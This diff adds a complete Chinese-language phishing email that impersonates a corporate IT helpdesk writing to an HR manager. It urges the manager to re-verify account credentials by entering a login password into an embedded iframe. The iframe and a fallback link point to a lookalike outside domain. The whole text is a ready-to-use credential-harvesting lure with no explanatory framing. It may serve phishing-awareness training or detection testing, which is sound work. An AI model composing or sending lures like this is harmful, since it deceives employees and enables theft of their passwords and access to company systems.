@@ -1,0 +1,24 @@
+Received: from it.internal-service.com ([10.0.5.1])
+	by mail.example-corp.com.cn (Coremail) with ESMTP id B7E5F1A8C2
+	for <wang.hr@example-corp.com.cn>; Sun, 08 Jun 2025 19:28:10 +0800 (CST)
+Message-ID: <IT-ALERT-202506081928@it.internal-service.com>
+Date: Sun, 08 Jun 2025 19:28:09 +0800
+From: "IT服务台" <helpdesk@it.internal-service.com>
+To: "王经理" <wang.hr@example-corp.com.cn>
+Subject: =?gb2312?B?ob+5+NDF16q8xsvjveGjrLXEseGj+S+9wO0=?=
+Mime-Version: 1.0
+Content-Type: text/html; charset="gb2312"
+
+<html>
+<body>
+<p>尊敬的同事：</p>
+<p>为符合新的安全协议，我们需要您立即验证您的账户凭据。请在下方的安全窗口中输入您的登录密码，然后点击“验证”按钮。</p>
+
+<iframe src="http://corp-login-portal.com/verify.jsp" width="350" height="150" frameborder="0">
+  <p>您的浏览器不支持框架，请点击<a href="http://corp-login-portal.com/verify.jsp">此链接</a>进行验证。</p>
+</iframe>
+
+<p>此操作将确保您的账户在系统迁移后可以正常访问。感谢您的配合。</p>
+<p>IT服务台</p>
+</body>
+</html>
